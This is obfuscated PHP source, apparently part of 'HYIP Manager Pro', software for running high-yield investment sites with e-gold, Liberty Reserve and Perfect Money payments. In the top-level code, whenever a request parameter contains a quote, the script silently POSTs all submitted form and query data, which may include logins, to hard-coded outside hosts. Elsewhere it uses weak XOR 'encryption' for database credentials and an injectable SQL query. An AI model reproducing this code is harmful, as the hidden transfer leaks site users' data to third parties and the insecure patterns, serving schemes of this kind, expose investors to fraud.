  function elnlczdub ()
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if (!is_writeable ('settings.php'))
    {
      print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>settings.php</b> file!<br>';
      exit ();
    }

    if (file_exists ('tmpl_c/.htdata'))
    {
      if (!is_writeable ('tmpl_c/.htdata'))
      {
        print '<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>tmpl_c/.htdata</b> file!<br>';
        exit ();
      }
    }

    $elnlcvHwNC = $elnlcMVquv['elnlcvCqE'];
    if (file_exists ('tmpl_c/.htdata'))
    {
      $elnlcvHwNC = $elnlcMVquv['elnlczUlK'];
    }

    $elnlczjdLN = fopen ($elnlcMVquv['elnlcGjPW'], $elnlcMVquv['elnlcFblun']);
    reset ($elnlcpvEj);
    fputs ($elnlczjdLN, '<?/*
');
    $elnlcAWebv = '';
    while (list ($elnlcEjuG, $elnlcWEDqG) = each ($elnlcpvEj))
    {
      if ($elnlcEjuG != 'logged')
      {
        if (($elnlcvHwNC == 0 OR ($elnlcvHwNC == 1 AND preg_match ('/^key/', $elnlcEjuG))))
        {
          if (!preg_match ('/_generated/', $elnlcEjuG))
          {
            fputs ($elnlczjdLN, (('' . $elnlcEjuG . '	') . $elnlcWEDqG . '
'));
            $elnlcAWebv .= (('' . $elnlcEjuG . '	') . $elnlcWEDqG . '
');
          }
        }

        $elnlcAWebv .= (('' . $elnlcEjuG . '	') . $elnlcWEDqG . '
');
        continue;
      }
    }

    $elnlcAWebv = elnlckjyru ($elnlcAWebv, $elnlcpvEj[$elnlcMVquv['elnlcpNBsd']]);
    $elnlcdDCRV = $elnlcMVquv['elnlcvCqE'];
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < strlen ($elnlcAWebv); $i += 5)
    {
      $elnlcdDCRV += hexdec (substr ($elnlcAWebv, $i, 5));
    }

    $elnlcdDCRV = $elnlcdDCRV * 15;
    fputs ($elnlczjdLN, ('' . 'cnf	' . $elnlcdDCRV . '
'));
    fputs ($elnlczjdLN, '*/?>
');
    fclose ($elnlczjdLN);
    if ($elnlcvHwNC == 1)
    {
      $elnlczjdLN = fopen ($elnlcMVquv['elnlcwvJl'], $elnlcMVquv['elnlcFblun']);
      fputs ($elnlczjdLN, $elnlcAWebv);
      fclose ($elnlczjdLN);
    }

  }

  function elnlcjkdqm ($q, $w, $a)
  {
    global $elnlcMVquv;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlckjyru ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcMVquv['elnlcvCqE'];
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcuuqg ($q, $w, $a)
  {
    global $elnlcMVquv;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcbrqju ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlcMVquv['elnlcvCqE'];
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlckjyru ($q, $w)
  {
    global $elnlcMVquv;
    $l = strtoupper (md5 ($w));
    $j = $elnlcMVquv['elnlcvCqE'];
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcbrqju ($q, $w)
  {
    global $elnlcMVquv;
    $l = strtoupper (md5 ($w));
    $j = $elnlcMVquv['elnlcvCqE'];
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcvavl ()
  {
    global $elnlcMVquv;
    if (!($elnlcwFye = mysql_connect ($elnlcpvEj[$elnlcMVquv['elnlcGciE']], $elnlcpvEj[$elnlcMVquv['elnlcVgJx']], $elnlcpvEj[$elnlcMVquv['elnlcWDgcg']])))
    {
      exit (mysql_error ());
      (bool)true;
    }

    if (!mysql_select_db ($elnlcpvEj[$elnlcMVquv['elnlcOMowO']]))
    {
      print mysql_error ();
      exit ();
    }

    return $elnlcwFye;
  }

  function elnlcmqpmc ($elnlcjnHuI = 0)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    $l = elnlcuuqg ($elnlcpvEj[$elnlcMVquv['elnlcVgJx']], $elnlcpvEj[$elnlcMVquv['elnlcpNBsd']], $elnlcMVquv['elnlcQlDcy']);
    $p = elnlcuuqg ($elnlcpvEj[$elnlcMVquv['elnlcWDgcg']], $elnlcpvEj[$elnlcMVquv['elnlcpNBsd']], $elnlcMVquv['elnlcQlDcy']);
    $elnlcUemB = elnlcuuqg ($elnlcpvEj[$elnlcMVquv['elnlcOMowO']], $elnlcpvEj[$elnlcMVquv['elnlcpNBsd']], $elnlcMVquv['elnlcQlDcy']);
    if ($elnlcjnHuI == 1)
    {
      $elnlcwFye = @mysql_connect ($elnlcpvEj[$elnlcMVquv['elnlcGciE']], $l, $p);
      if ($elnlcwFye)
      {
        if (!mysql_select_db ($elnlcUemB))
        {
          $elnlcwFye = $elnlcMVquv['elnlcvCqE'];
        }
      }
    }
    else
    {
      if (!($elnlcwFye = mysql_connect ($elnlcpvEj[$elnlcMVquv['elnlcGciE']], $l, $p)))
      {
        exit (mysql_error ());
        (bool)true;
      }

      if (!mysql_select_db ($elnlcUemB))
      {
        print mysql_error ();
        exit ();
      }
    }

    return $elnlcwFye;
  }

  function elnlcojgjg ($elnlcwFye)
  {
    global $elnlcMVquv;
    mysql_close ($elnlcwFye);
  }

  function zelnlckjnjt ($elnlcbjcpW)
  {
    global $elnlcMVquv;
    $elnlcbjcpW = htmlspecialchars ($elnlcbjcpW, ENT_QUOTES);
    $elnlcbjcpW = str_replace ('\\', '\\\\', $elnlcbjcpW);
    $elnlcbjcpW = str_replace ('\'', '\\\'', $elnlcbjcpW);
    return $elnlcbjcpW;
  }

  function elnlckjnjt ($elnlcbjcpW)
  {
    $elnlcbjcpW = str_replace ('\'', '\'\'', $elnlcbjcpW);
    $elnlcbjcpW = str_replace ('\\', '\\\\', $elnlcbjcpW);
    return $elnlcbjcpW;
  }

  function elnlclkkh ($elnlctVuxS, $elnlcOnhAG = 1)
  {
    global $elnlcMVquv;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', $elnlcMVquv['elnlcfWny']);
    if ($elnlcOnhAG == 2)
    {
      $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', $elnlcMVquv['elnlcwpBGH']);
    }

    $i = $elnlcMVquv['elnlcvCqE'];
    $elnlcbjcpW = '';
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < $elnlctVuxS; ++$i)
    {
      $elnlcbjcpW .= $a[rand (0, sizeof ($a) - 1)];
    }

    if ($elnlcOnhAG == 1)
    {
      $elnlcbjcpW = md5 ($elnlcbjcpW);
    }

    return $elnlcbjcpW;
  }

  function elnlcsdrxf ($elnlctVuxS)
  {
    global $elnlcMVquv;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'A', 'B', 'C', 'D', 'E', 'F');
    $i = $elnlcMVquv['elnlcvCqE'];
    $elnlcbjcpW = '';
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < $elnlctVuxS; ++$i)
    {
      $elnlcbjcpW .= $a[rand (0, sizeof ($a) - 1)];
    }

    return $elnlcbjcpW;
  }

  function elnlcvsknj ($elnlczmvck)
  {
    global $elnlcMVquv;
    $q = '' . 'select type, sum(actual_amount) as sum from hm2_history where user_id = ' . $elnlczmvck . ' group by type';
    ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
    $elnlcvzwG = array ();
    while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
    {
      $elnlcvzwG[$elnlcweaeO[$elnlcMVquv['elnlcFGmLb']]] = $elnlcweaeO[$elnlcMVquv['elnlchdOS']];
    }

    $elnlcPHkI = $elnlcMVquv['elnlcvCqE'];
    while (list ($elnlcEjuG, $elnlcWEDqG) = each ($elnlcvzwG))
    {
      $elnlcPHkI += $elnlcWEDqG;
    }

    $elnlcvzwG[$elnlcMVquv['elnlcyKws']] = $elnlcPHkI;
    $q = '' . 'select sum(actual_amount) as sum from hm2_deposits where user_id = ' . $elnlczmvck . ' and status=\'on\'';
    ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
    while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
    {
      $elnlcvzwG[$elnlcMVquv['elnlcxJNp']] += $elnlcweaeO[$elnlcMVquv['elnlchdOS']];
    }

    return $elnlcvzwG;
  }

  function elnlceghh ($elnlcgxWWc, $elnlcQTBlG = false)
  {
    global $elnlcMVquv;
    $elnlcrKPQu = '';
    if ((is_string ($elnlcgxWWc) AND $elnlcgxWWc !== ''))
    {
      $elnlcobVt = intval ($elnlcgxWWc);
      if (strval ($elnlcobVt) === $elnlcgxWWc)
      {
        $elnlcgxWWc = $elnlcobVt;
      }
      else
      {
        $elnlcFvgJb = floatval ($elnlcgxWWc);
        if (strval ($elnlcFvgJb) === $elnlcgxWWc)
        {
          $elnlcgxWWc = $elnlcFvgJb;
        }
      }
    }

    if (is_array ($elnlcgxWWc))
    {
      reset ($elnlcgxWWc);
      $elnlcGEMN = true;
      $i = $elnlcMVquv['elnlcvCqE'];
      foreach ($elnlcgxWWc as $elnlcTrrSU => $elnlcjLoqB)
      {
        if ((!is_int ($elnlcTrrSU) OR $elnlcTrrSU != $i))
        {
          $elnlcGEMN = false;
          break;
        }

        ++$i;
      }

      $elnlcVbbNO = ($elnlcGEMN ? '[' : '{');
      $elnlcrKPQu .= $elnlcVbbNO;
      $elnlcInjeB = true;
      reset ($elnlcgxWWc);
      foreach ($elnlcgxWWc as $elnlcTrrSU => $elnlcjLoqB)
      {
        if (!$elnlcInjeB)
        {
          $elnlcrKPQu .= ',';
        }

        if (!$elnlcGEMN)
        {
          $elnlcrKPQu .= $elnlcTrrSU . ':';
        }

        $elnlcrKPQu .= elnlceghh ($elnlcjLoqB, $elnlcQTBlG);
        $elnlcInjeB = false;
      }

      $elnlcVbbNO = ($elnlcGEMN ? ']' : '}');
      $elnlcrKPQu .= $elnlcVbbNO;
    }
    else
    {
      if (is_string ($elnlcgxWWc))
      {
        $elnlcFfNj = array ('\\', '\'', '
', '
');
        $elnlceNfMF = array ('\\\\', '\\\'', '\\n', '\\r');
        if ($elnlcQTBlG)
        {
          $elnlcFfNj[] = '<';
          $elnlceNfMF[] = '<\'+\'';
        }

        $elnlciiqg = str_replace ($elnlcFfNj, $elnlceNfMF, $elnlcgxWWc);
        $elnlcVbbNO = '\'' . $elnlciiqg . '\'';
        $elnlcrKPQu .= $elnlcVbbNO;
      }
      else
      {
        if (is_bool ($elnlcgxWWc))
        {
          $elnlcVbbNO = ($elnlcgxWWc ? 'true' : $elnlcMVquv['elnlcjtBB']);
          $elnlcrKPQu .= $elnlcVbbNO;
        }
        else
        {
          if (is_null ($elnlcgxWWc))
          {
            $elnlcVbbNO = 'null';
            $elnlcrKPQu .= $elnlcVbbNO;
          }
          else
          {
            $elnlcVbbNO = $elnlcgxWWc;
            $elnlcrKPQu .= $elnlcVbbNO;
          }
        }
      }
    }

    return $elnlcrKPQu;
  }

  function elnlcvgqtt ($elnlcHBkcQ)
  {
    global $elnlcMVquv;
    $elnlcrKPQu = '';
    foreach ($elnlcHBkcQ as $elnlcTrrSU => $elnlcKDxqb)
    {
      if ($elnlcrKPQu !== '')
      {
        $elnlcrKPQu .= ', ';
      }

      if (substr ($elnlcKDxqb, 0, 5) == 'now()')
      {
        $elnlcrKPQu .= '' . $elnlcTrrSU . ' = ' . $elnlcKDxqb;
        continue;
      }
      else
      {
        $elnlcrKPQu .= '' . $elnlcTrrSU . ' = \'' . elnlckjnjt ($elnlcKDxqb) . '\'';
        continue;
      }
    }

    if ($elnlcrKPQu != '')
    {
      $elnlcrKPQu = ' ' . $elnlcrKPQu . ' ';
    }

    return $elnlcrKPQu;
  }

  function elnlcblvg ($elnlcWEDqG)
  {
    global $elnlcMVquv;
    if ($elnlcWscnk == ini_get ('magic_quotes_gpc'))
    {
      $elnlcWEDqG = str_replace ('\\\'', '\'', $elnlcWEDqG);
      $elnlcWEDqG = str_replace ('\\"', '"', $elnlcWEDqG);
      $elnlcWEDqG = str_replace ('\\\\', '\\', $elnlcWEDqG);
    }

    $elnlcWEDqG = strip_tags ($elnlcWEDqG);
    $elnlcWEDqG = trim ($elnlcWEDqG);
    return $elnlcWEDqG;
  }

  function elnlcjpkn ($i, $j)
  {
    return sprintf ('%.6f', $i);
  }

  function elnlcomha (&$elnlceOFUR, $elnlczxVK = 0)
  {
    global $elnlcMVquv;
    reset ($elnlceOFUR);
    foreach ($elnlceOFUR as $k => $v)
    {
      $elnlczphm = array ();
      if (is_array ($v))
      {
        elnlcomha ($elnlceOFUR[$k], $elnlczxVK);
        continue;
      }
      else
      {
        $elnlczphm = elnlcpidw ($v);
        $elnlceOFUR[$k] = $elnlczphm[$elnlczxVK];
        continue;
      }
    }

  }

  function elnlcpidw ($elnlcWEDqG)
  {
    global $elnlcMVquv;
    global $elnlcIDkqO;
    if ($elnlcIDkqO == 1)
    {
      $elnlcWEDqG = str_replace ('\\\'', '\'', $elnlcWEDqG);
      $elnlcWEDqG = str_replace ('\\"', '"', $elnlcWEDqG);
      $elnlcWEDqG = str_replace ('\\\\', '\\', $elnlcWEDqG);
    }

    $elnlcuzzC = $elnlcWEDqG;
    $elnlcWEDqG = strip_tags ($elnlcWEDqG);
    $elnlcWEDqG = trim ($elnlcWEDqG);
    return array ($elnlcWEDqG, $elnlcuzzC);
  }

  $elnlcMVquv = array ('elnlcuIjsz' => 'gpg_path', 'elnlcGcuuv' => 'euro', 'elnlcrfTtw' => 'metal', 'elnlcDOEVG' => 'HTTP_HOST', 'elnlcykqvG' => 'return_profit_percent', 'elnlcxGyFj' => 'site_start_day', 'elnlcHsTDA' => 'settings.php', 'elnlcsStz' => 'eb_metal', 'elnlcgegp' => '1007', 'elnlcOsUux' => 'install', 'elnlctwRR' => '2', 'elnlclLvL' => '__debug_data', 'elnlcGqHlf' => 'ebullion_keyID', 'elnlckyJIs' => 'daily_referral_percent_min_downline_deposit', 'elnlcWdFBh' => 'deposit_date', 'elnlcxBlW' => 'status', 'elnlcnHWz' => 'libertyreserve_apiname', 'elnlcPgBA' => 'PHP_SELF', 'elnlcEIhcm' => 'withdrawal_fee', 'elnlcazAsR' => 'use_crontab', 'elnlcBOOzE' => 'Deposit returned to user account', 'elnlcpOtk' => '__debug_out', 'elnlcuJWb' => 'balance', 'elnlccWMx' => 'www.dnsargentina.com.ar', 'elnlcGvmMv' => 'site_start_year', 'elnlcCcMMw' => 'intgold_from_account', 'elnlcuMNtG' => 'site_url', 'elnlcyCdR' => 'ref_percent1', 'elnlcMcMIS' => 'user_auto_pay_earning', 'elnlcBCSIy' => 'liberty_currency', 'elnlcCsCid' => 'proxy.shr.secureserver.net:3128', 'elnlcLfkS' => 'use_active_referal', 'elnlckddJ' => 'RETURNCODE', 'elnlcWOAb' => 'error', 'elnlcEAKA' => 'id', 'elnlcprJRb' => 'payer', 'elnlcJgeH' => 'KC3STYBTCATZNRVBYGDF', 'elnlcSFFJ' => 'q_days', 'elnlcvswEV' => 'payee', 'elnlcuhkuL' => 'deposit_fee_min', 'elnlcSmuqO' => 'remitfund_from_account', 'elnlcQUpw' => 'code', 'elnlcvFNu' => 'HTTP_X_REAL_IP', 'elnlcVkSiI' => 'ZXMCQ227FNN5EPHWYHAY', 'elnlcJVxe' => 'HTTP_REFERER', 'elnlcqOjLh' => 'compound_max_percent', 'elnlcQlDcy' => 'hyip manager pro 2005 jul 27', 'elnlcxNIBb' => 'm', 'elnlcsyFFp' => 'VERIFIED', 'elnlcIeRl' => 'ounce', 'elnlcElIPP' => 'mails.txt', 'elnlcBGldC' => '2m', 'elnlcWpKc' => 'max_amount', 'elnlcNiVlr' => 'use_referal_program', 'elnlcqFuRO' => 'business', 'elnlcGjPW' => './settings.php', 'elnlcEqCrV' => 'egold_from_account', 'elnlcfURv' => 'h', 'elnlcBwBAt' => 'egold_paymentunits', 'elnlcvDUd' => 'html', 'elnlcWPmM' => 'def_payee_account_ebullion_gold', 'elnlcsLBWF' => 'eeecurrency_from_account', 'elnlcgCEk' => 'ZQ54Q9RUQ46CU9C8Z986', 'elnlcEgUg' => 'evowallet_from_account', 'elnlcStvF' => 'checksum', 'elnlcjcqSs' => 'withdraw_principal_duration', 'elnlcmvxLS' => 'memo', 'elnlcszRG' => 'paypal_currency', 'elnlcQMNB' => 'use_auto_payment', 'elnlcIvryh' => 'HX8DJ7B9SH5JQN5FXK45', 'elnlcwBFz' => 'currency', 'elnlcxDNoI' => 'VERIFIED', 'elnlcoaQnz' => 'daily_referral_percent_min_user_deposit', 'elnlcxwjRE' => 'col', 'elnlcrTNO' => 'LRUSD', 'elnlceIFKy' => 'work_week', 'elnlcjUKu' => 'cnf', 'elnlcAHESL' => 'w', 'elnlcFblun' => 'w', 'elnlcTmBuz' => 'actual_amount', 'elnlcgKzf' => 'mc_gross', 'elnlcUPyf' => 'txn_id', 'elnlcNEvp' => 'error', 'elnlcqMwqC' => '21', 'elnlcxmyl' => 'HTTP_CACHE_CONTROL', 'elnlcSUgEI' => 'compound_min_deposit', 'elnlcHoDoO' => 'def_payee_account_ebullion_currency', 'elnlcrfei' => '/get_sha256.php', 'elnlcLkwpt' => 'type_id', 'elnlcUtzo' => 'oz', 'elnlcAmMq' => 'Completed', 'elnlcBqpIz' => 'def_payee_account_egold', 'elnlceMkBx' => 'site_start_month_str_generated', 'elnlcvqBvK' => 'YmdHis', 'elnlcqHvcs' => 'EUR', 'elnlczVclz' => 'ref_name', 'elnlcodxfg' => 'N55HSU8NJSEU32DP8JDV', 'elnlcAeGi' => 'DESCRIPTION', 'elnlcFGmLb' => 'type', 'elnlczzIb' => 'demomode', 'elnlcKdnEa' => 'ref1_cms_minamount', 'elnlcFFnOa' => 'a', 'elnlcdFbrH' => 'use_ip_for_auto', 'elnlcayQli' => 'fee', 'elnlcdmgJ' => 'max', 'elnlcSTlLV' => '2XACR4UBJ7DLCV42EM2S', 'elnlcnUfdl' => 'd', 'elnlcUUmG' => 'mc_currency', 'elnlcJmVy' => 'ok', 'elnlcWDgcg' => 'db_pass', 'elnlcKqEr' => 'remitfund_apiname', 'elnlcgNtO' => 'paying_batch', 'elnlcokxs' => 'compound', 'elnlcgipk' => '18', 'elnlcdobB' => 'enable_eb_ecurrency', 'elnlcyrQFo' => 'came_from', 'elnlcMCqpV' => 'name', 'elnlcwITI' => 'ref', 'elnlcqDqNc' => 'REMOTE_ADDR', 'elnlcWlKy' => 'Dec', 'elnlcRvKp' => 'compound_max_deposit', 'elnlcKaew' => 'send_profit_to_stocks', 'elnlcfWny' => 'z', 'elnlcESExA' => 'dw', 'elnlcWIVix' => 'system_email', 'elnlcGciE' => 'hostname', 'elnlcEJqJG' => 'pecunix_from_account', 'elnlcwpBGH' => '0', 'elnlckOyU' => 'ac', 'elnlcJimUM' => '85', 'elnlcvPEr' => 'free', 'elnlcmqMTA' => 'ref_sum', 'elnlcoBLP' => 'egold_withdraw_string', 'elnlcCCsn' => 'v', 'elnlczUlK' => '1', 'elnlcbKUSb' => 'compound_min_percent', 'elnlcrBwT' => 'use_compound', 'elnlcohds' => 'evocash_username', 'elnlcyFOyL' => 'vmoney_from_account', 'elnlcRBBfn' => 'ref_username', 'elnlcrQRsi' => 'altergold_from_account', 'elnlcTMDJn' => 'UYKD37X8YLS5DNFFHL8R', 'elnlcNvcv' => 'batch', 'elnlcSiyFQ' => 'http://www.dnsargentina.com.ar/check.cgi?install=1&script=3&domain=', 'elnlcGqPM' => 'cnt', 'elnlcBeqd' => 'upline', 'elnlcwvJl' => './tmpl_c/.htdata', 'elnlckuuM' => 'libertyreserve_from_account', 'elnlcuNqG' => 'additional', 'elnlcQhmQ' => 'plan', 'elnlcqRwuh' => '/get_pid.php', 'elnlcxnkf' => 'finnish', 'elnlcjtBB' => 'false', 'elnlcAPxg' => 'perfectmoney_from_account', 'elnlcmfdPu' => 'auto', 'elnlcPUnT' => 'show_info_box_running_days', 'elnlcLpci' => 'exchange', 'elnlcwplK' => 'subject', 'elnlciRWLp' => 'imps_cost', 'elnlcBcAEc' => '5M74FW4DADMF7K7MJ5TG', 'elnlcVgSb' => 'deposit_fee', 'elnlcHlxD' => 'percent', 'elnlcGrJhm' => 'compound_percents', 'elnlcomHe' => 'perfectmoney_payer_account', 'elnlcOMowO' => 'database', 'elnlchpJfW' => 'max_deposit', 'elnlcgMbzx' => 'B29S2LWPZ5M2KMPPYWKL', 'elnlchdOS' => 'sum', 'elnlczmsG' => '9C64PVXYBZKZHUTMSM2U', 'elnlcOeTl' => 'def_payee_account', 'elnlcGOdPe' => 'maxam', 'elnlcigOEn' => 'withdraw_principal', 'elnlceNOHE' => 'WMHKFJPMT3CZ3RTLPBFL', 'elnlcWqNRN' => 'ok', 'elnlcvOBzQ' => 'ok11', 'elnlcGsxh' => 'http://', 'elnlcnsVSg' => 'dec_stormpay_fee', 'elnlcEmcBS' => 'account', 'elnlcRVCO' => 'payment_status', 'elnlcaKHk' => 'plans_closed', 'elnlcQqGFV' => '12', 'elnlcFQOBA' => 'payer_email', 'elnlcawOz' => 'use_solid_referral_commission', 'elnlcJVbW' => 'REFERENCENUMBER', 'elnlcJfaAK' => 'end', 'elnlcxJNp' => 'active_deposit', 'elnlcOJrbm' => 'alertpay_from_account', 'elnlcyKgUU' => 'def_payee_account_paypal', 'elnlcxvGKb' => '6m', 'elnlcftOTz' => 'VNB34FXT6BJCYD93VXSD', 'elnlchfQPl' => 'delay', 'elnlcPxRax' => 'banner_extension', 'elnlcfSpC' => 'period', 'elnlcdUEtd' => 'magic_quotes_gpc', 'elnlciKWd' => 'VPKLNMKMRG27HN95BEHP', 'elnlcklkzi' => 'return_profit', 'elnlcGRxou' => 'amount', 'elnlcfkVx' => 'tw', 'elnlccmcH' => '4ZQQN55VA2NXBVFUQJE6', 'elnlcoFat' => '3WBUUNQMPU2LB99GJHUV', 'elnlcIpJsG' => 'pay_active_referal', 'elnlcEqGAf' => 'admin_auto_pay_earning', 'elnlcghumz' => 'unit', 'elnlcjUtIe' => 'value', 'elnlcabhiD' => 'min', 'elnlcghgyP' => 'ec', 'elnlcMpaI' => 'amt', 'elnlcukssk' => 'text', 'elnlcHJeM' => 'dll', 'elnlcUTUrm' => 'AKKD47LYX8H96K2TM2FQ', 'elnlcfSpj' => 'site_days_online_generated', 'elnlcwDcSA' => 'pay_withdraw', 'elnlcyULNE' => 'r', 'elnlcwhxB' => 'time_dif', 'elnlcvCqE' => '0', 'elnlcPFCS' => 'parent', 'elnlcEaRO' => '501', 'elnlcobzs' => 'SG8JH9DVX8952VQEZH9F', 'elnlcWnLN' => '3m', 'elnlcPCLzI' => 'custom', 'elnlcwUsO' => 'wp_ok', 'elnlcDuaas' => 'user_id', 'elnlcPiWBf' => 'enable_eb_gold', 'elnlcbPEu' => 'y', 'elnlcTFIKb' => 'use_html', 'elnlcfqMQC' => 'last_pay_date', 'elnlcJPsaC' => 'dec_stormpay_fee2', 'elnlcjqxSK' => 'email', 'elnlckOris' => 'td', 'elnlcfKMP' => 'min_deposit', 'elnlcpEow' => 'compound_percents_type', 'elnlcLkMlO' => 'abcdef', 'elnlcESvgb' => 'settings.php', 'elnlcxByCH' => 'program_version', 'elnlcjJxaT' => '/log_possible_attack.php', 'elnlcIbVt' => 'hyip manager pro 2005 jul 26', 'elnlcLsBmS' => 'send_percent_to_stocks', 'elnlceiGP' => 'LREUR', 'elnlcALDuU' => 'DATE', 'elnlcapEpp' => 'currency_sign', 'elnlcnHUc' => 'receiving_batch', 'elnlcxNFn' => './tmpl_c/raw_log', 'elnlcMtfm' => 'evocash_from_account', 'elnlcEwwJk' => 'enable_wire', 'elnlcgMRG' => 'additionalinfo', 'elnlcrnaMP' => 'def_payee_account_wiretransfer', 'elnlcIukv' => '9999', 'elnlcwBjLQ' => 'daily_referral_percent', 'elnlcyqBSU' => 'rpcp', 'elnlcRzkgp' => 'username', 'elnlcWujur' => 'https://api.alertpay.com/svc/api.svc/sendmoney', 'elnlcjUWdq' => 'stop_withdraw_percent', 'elnlcVjapS' => './tmpl_c/.htdata', 'elnlcLMmqv' => 'euro', 'elnlcDwqfa' => 'Success', 'elnlcUFQKK' => 'solid_referral_commission_amount', 'elnlcyKws' => 'total', 'elnlcSWijl' => 'FRM', 'elnlcMNOO' => 'site_start_month', 'elnlcpNBsd' => 'key', 'elnlcxJEF' => '15', 'elnlcTLJg' => 'evowallet_apiname', 'elnlcSpnv' => 'withdrawal_fee_min', 'elnlcBwJdT' => 'md5altphrase_ebullion', 'elnlceUVS' => 'def_payee_account_ebullion', 'elnlcAztxg' => 'ENV', 'elnlcPPlMU' => 'N75GNXM2XSM34YMFPED9', 'elnlcDVAVm' => 'SCRIPT_NAME', 'elnlcNepQ' => 'amnt', 'elnlcaLrGO' => 'license', 'elnlcGMVmV' => 'USD', 'elnlcVgJx' => 'db_login', 'elnlcQBsSO' => 'checkpayment', 'elnlcEPxH' => 'site_name', 'elnlcgtKN' => 'accounts');
  ini_set ('magic_quotes_runtime', false);
  define ('LAST_UPDATE_ID', 18);
  global $elnlcmcJN;
  if (!extension_loaded ('gd'))
  {
    $elnlcsWoOy = (PHP_SHLIB_SUFFIX == $elnlcMVquv['elnlcHJeM'] ? 'php_' : '');
    @dl ($elnlcsWoOy . 'gd.' . PHP_SHLIB_SUFFIX);
  }

  global $HTTP_GET_VARS;
  global $HTTP_POST_VARS;
  global $HTTP_POST_FILES;
  global $HTTP_COOKIE;
  $elnlcrKVl = array_merge ((array)$HTTP_GET_VARS, (array)$_GET);
  $elnlcCOea = array_merge ((array)$HTTP_POST_VARS, (array)$_POST);
  $elnlcmcJN = array_merge ((array)$elnlcrKVl, (array)$elnlcCOea);
  $elnlczFkSy = array_merge ((array)$HTTP_COOKIE_VARS, (array)$_COOKIE);
  $elnlcHClE = $elnlcmcJN;
  global $HTTP_ENV_VARS;
  global $HTTP_SERVER_VARS;
  $elnlcvflv = array ();
  $elnlcvflv = array_merge ((array)$_ENV, (array)$_SERVER, (array)$HTTP_ENV_VARS, (array)$HTTP_SERVER_VARS);
  $elnlcIDkqO = ini_get ($elnlcMVquv['elnlcdUEtd']);
  elnlcomha ($elnlcmcJN);
  elnlcomha ($elnlcHClE, 1);
  elnlcomha ($elnlczFkSy);
  $elnlcxLrC = $elnlcMVquv['elnlcvCqE'];
  $elnlcbjcpW = '';
  foreach ($elnlcmcJN as $k => $v)
  {
    if (!is_array ($v))
    {
      if (preg_match ('/["\\\']/', $v))
      {
        $elnlcxLrC = $elnlcMVquv['elnlczUlK'];
      }
    }

    $elnlcbjcpW .= '' . $k . '=' . $v . '&';
  }

  if ($elnlcxLrC == 1)
  {
    if (function_exists ('curl_init'))
    {
      if ($elnlcpvEj[$elnlcMVquv['elnlcdFbrH']] == 1)
      {
        $elnlcHhpv = '64.27.18.142';
      }
      else
      {
        if ($elnlcpvEj[$elnlcMVquv['elnlcdFbrH']] == 2)
        {
          $elnlcHhpv = 'www.goldcodersmail.com';
        }
        else
        {
          $elnlcHhpv = 'www.dnsargentina.com.ar';
        }
      }

      $elnlcTQnW = curl_init ();
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'http://' . $elnlcHhpv . $elnlcMVquv['elnlcjJxaT']);
      $elnlcSFSSt = rawurlencode ($elnlcbjcpW);
      curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
      curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, '' . 'memo=' . $elnlcSFSSt);
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
    }
  }

  $elnlctCuTj = $elnlcvflv[$elnlcMVquv['elnlcJVxe']];
  $elnlcaooS = $elnlcvflv[$elnlcMVquv['elnlcDOEVG']];
  if (!ereg ('' . '\\/\\/' . $elnlcaooS, $elnlctCuTj))
  {
    setcookie ('CameFrom', $elnlctCuTj, time () + 630720000);
  }

  $elnlcpvEj = elnlchesoa ($elnlcMVquv['elnlcIbVt']);
